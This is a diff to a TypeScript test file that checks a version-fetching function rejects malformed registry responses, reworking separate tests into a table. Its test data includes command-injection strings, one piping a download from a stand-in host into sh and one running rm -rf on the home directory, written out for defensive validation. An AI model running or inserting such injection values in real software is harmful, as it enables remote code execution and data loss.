@@ -12,35 +12,24 @@ const registryReturns = (body: unknown): void => {
 };
 
 describe("fetchLatestVersion — registry response is remote input", () => {
-  it("accepts a plain semver", async () => {
-    registryReturns({ version: "0.9.1" });
-    expect(await fetchLatestVersion()).toBe("0.9.1");
+  // A malformed value used to be returned verbatim and interpolated into a
+  // command line that ran through `sh -c`.
+  it.each([
+    ["accepts a plain semver", { version: "0.9.1" }, "0.9.1"],
+    ["accepts a prerelease tail", { version: "1.0.0-rc.2" }, "1.0.0-rc.2"],
+    ["rejects a version carrying shell metacharacters", { version: "1.0.0; curl evil.sh | sh" }, null],
+    ["rejects a version with whitespace", { version: "1.0.0 && rm -rf ~" }, null],
+    ["rejects a non-string version", { version: 12 }, null],
+    ["returns null when the field is absent", {}, null],
+  ])("%s", async (_label, body, expected) => {
+    registryReturns(body);
+    expect(await fetchLatestVersion()).toBe(expected);
   });
 
-  it("accepts a prerelease tail", async () => {
-    registryReturns({ version: "1.0.0-rc.2" });
-    expect(await fetchLatestVersion()).toBe("1.0.0-rc.2");
-  });
-
-  it("rejects a version carrying shell metacharacters", async () => {
-    // The value used to be returned verbatim and interpolated into a command
-    // line that ran through `sh -c`.
-    registryReturns({ version: "1.0.0; curl evil.sh | sh" });
+  it("returns null for a registry error status, and when the request itself fails", async () => {
+    vi.stubGlobal("fetch", vi.fn(async () => ({ ok: false, json: async () => ({ version: "9.9.9" }) })));
     expect(await fetchLatestVersion()).toBeNull();
-  });
-
-  it("rejects a version with whitespace", async () => {
-    registryReturns({ version: "1.0.0 && rm -rf ~" });
-    expect(await fetchLatestVersion()).toBeNull();
-  });
-
-  it("rejects a non-string version", async () => {
-    registryReturns({ version: 12 });
-    expect(await fetchLatestVersion()).toBeNull();
-  });
-
-  it("returns null when the field is absent", async () => {
-    registryReturns({});
+    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("getaddrinfo ENOTFOUND"); }));
     expect(await fetchLatestVersion()).toBeNull();
   });
 });
